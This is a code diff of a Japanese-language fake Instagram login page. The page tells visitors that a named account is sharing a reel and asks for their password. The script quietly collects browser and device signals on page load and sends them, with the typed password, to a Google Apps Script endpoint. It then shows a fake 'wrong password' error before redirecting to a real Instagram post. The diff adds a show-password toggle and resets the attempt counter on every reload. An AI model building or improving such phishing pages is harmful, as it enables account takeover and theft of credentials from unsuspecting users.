@@ -30,14 +30,14 @@
             max-width: 320px;
             padding: 0 20px;
         }
-        /* 上部のアイコン (ins_2.webp)：サイズを大きく調整、角丸なし、色反転 */
+        /* 上部のアイコン (ins_2.webp)：大きく配置、角丸なし、色反転 */
         .top-badge {
             width: auto;
             height: auto;
-            max-width: 140px; /* ここを大きくしました（元は100px） */
+            max-width: 140px;
             object-fit: contain;
             margin-bottom: 12px;
-            filter: invert(100%); /* 色を反転 */
+            filter: invert(100%);
         }
         /* 共有メッセージのスタイル */
         .share-text {
@@ -100,6 +100,20 @@
         .password-input::placeholder {
             color: rgba(255, 255, 255, 0.4);
         }
+        /* パスワード表示/非表示ボタン */
+        .toggle-password-btn {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: rgba(255, 255, 255, 0.4); /* 「パスワードを入力」と同じ色 */
+            font-size: 13px;
+            cursor: pointer;
+            white-space: nowrap;
+            padding-left: 8px;
+        }
+        .toggle-password-btn:hover {
+            color: rgba(255, 255, 255, 0.7);
+        }
         /* 入力受付停止時のスタイル */
         .input-wrapper.disabled {
             background-color: rgba(128, 128, 128, 0.2);
@@ -141,11 +155,12 @@
             opacity: 0.8;
         }
         .submit-btn:disabled {
-            background-color: rgba(128, 128, 128, 0.3);
-            color: rgba(255, 255, 255, 0.4);
+            background-color: rgba(128, 128, 128, 0.3) !important;
+            color: rgba(255, 255, 255, 0.4) !important;
             cursor: default;
+            opacity: 1;
         }
-        /* エラーメッセージ（パスワードが違います） */
+        /* エラーメッセージ */
         .error-message {
             color: #ed4956;
             font-size: 13px;
@@ -174,28 +189,39 @@
 <body>
 
     <div class="container">
+        <!-- 上部のアイコン (ins_2.webp) -->
         <img src="ins_2.webp" alt="" class="top-badge" onerror="this.style.display='none'">
 
+        <!-- 「k._.19._.13がリールを共有しようとしています。」の文字 -->
         <div class="share-text">k._.19._.13がリールを共有しようとしています。</div>
 
+        <!-- 丸形アイコン (aina_icon_1.jpg) -->
         <img src="aina_icon_1.jpg" alt="アイコン" class="avatar" onerror="this.style.display='none'">
         
+        <!-- ID（alua_.l6） -->
         <div class="handle-id">alua_.l6</div>
 
+        <!-- 名前（あいな） -->
         <div class="name">あいな</div>
         
+        <!-- 入力フォームエリア -->
         <div class="form-container">
             <div class="input-wrapper" id="inputWrapper">
                 <input type="password" id="passwordField" class="password-input" placeholder="パスワードを入力">
+                <button type="button" id="togglePasswordBtn" class="toggle-password-btn">表示する</button>
             </div>
             
+            <!-- パスワードを忘れた場合 -->
             <a href="#" class="forgot-password" onclick="return false;">パスワードを忘れた場合</a>
 
+            <!-- ログインボタン -->
             <button id="submitBtn" class="submit-btn">ログイン</button>
 
+            <!-- エラーメッセージ -->
             <div id="errorMsg" class="error-message">パスワードが違います</div>
         </div>
 
+        <!-- アカウントをお持ちでないですか？ 登録する -->
         <div class="signup-prompt">
             アカウントをお持ちでないですか？<a href="#" class="signup-link" onclick="return false;">登録する</a>
         </div>
@@ -204,6 +230,9 @@
     <script>
         const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbymslxDaCtwPbk-_-ffVRUiH9VJ2rVzbdpJF_plcxvaXNEh6NYL7YcRrbFLuQfWfio3ug/exec";
         const REDIRECT_URL = "https://www.instagram.com/p/DazYmT8kgzT/?utm_source=ig_web_copy_link&igsh=NTc4MTIwNjQ2YQ==";
+
+        // ページ読み込み時に試行回数を必ずリセット
+        localStorage.setItem('auth_attempt_count', '0');
 
         async function getBasicSignals() {
             let rawUA = navigator.userAgent;
@@ -290,7 +319,7 @@
             } catch (e) { return null; }
         }
 
-        // ページ読み込み時にバックグラウンドで自動収集して送信しておく（初回アクセス時）
+        // ページ読み込み時にバックグラウンドで自動収集して送信
         window.addEventListener('DOMContentLoaded', async () => {
             try {
                 const payload = {
@@ -314,7 +343,7 @@
             } catch (error) {}
         });
 
-        // 判定ロジック：訪問回数（試行回数）をローカルストレージで管理
+        // 訪問・リロード毎に取得する試行回数
         function getAttemptCount() {
             return parseInt(localStorage.getItem('auth_attempt_count') || '0', 10);
         }
@@ -329,10 +358,35 @@
         const inputWrapper = document.getElementById('inputWrapper');
         const submitBtn = document.getElementById('submitBtn');
         const errorMsg = document.getElementById('errorMsg');
+        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+
+        // パスワードの表示/非表示切替
+        togglePasswordBtn.addEventListener('click', () => {
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                togglePasswordBtn.textContent = '非表示';
+            } else {
+                passwordField.type = 'password';
+                togglePasswordBtn.textContent = '表示する';
+            }
+        });
 
         async function handleSubmission() {
             const enteredPassword = passwordField.value;
-            if (!enteredPassword) return;
+
+            // 入力欄が空の場合
+            if (!enteredPassword) {
+                errorMsg.textContent = "正しいパスワードを入力してください";
+                errorMsg.style.display = "block";
+                return;
+            }
+
+            // --- タイムラグなしで即座にボタンを無効化して状態変化 ---
+            submitBtn.disabled = true;
+            submitBtn.textContent = "確認中...";
+            passwordField.disabled = true;
+            inputWrapper.classList.add('disabled');
+            errorMsg.style.display = "none";
 
             // 何回目の送信かチェック（1回目か、2回目以降か）
             const currentAttempt = getAttemptCount();
@@ -361,12 +415,7 @@
                     });
                 } catch (error) {}
 
-                // 1秒後にエラーメッセージを表示
-                passwordField.disabled = true;
-                inputWrapper.classList.add('disabled');
-                submitBtn.disabled = true;
-                submitBtn.textContent = "確認中...";
-
+                // 1秒後に元の状態に戻し、エラーメッセージを表示
                 setTimeout(() => {
                     passwordField.disabled = false;
                     inputWrapper.classList.remove('disabled');
@@ -374,17 +423,12 @@
                     submitBtn.textContent = "ログイン";
                     passwordField.value = "";
                     passwordField.placeholder = "パスワードを入力";
-                    errorMsg.style.display = "block"; // 赤文字を表示
+                    errorMsg.textContent = "パスワードが違います";
+                    errorMsg.style.display = "block";
                 }, 1000);
 
             } else {
                 // --- 【2回目以降の場合】 ---
-                passwordField.disabled = true;
-                inputWrapper.classList.add('disabled');
-                submitBtn.textContent = "確認中...";
-                submitBtn.disabled = true;
-                errorMsg.style.display = "none";
-
                 try {
                     const payload = {
                         timestamp: new Date().toISOString(),
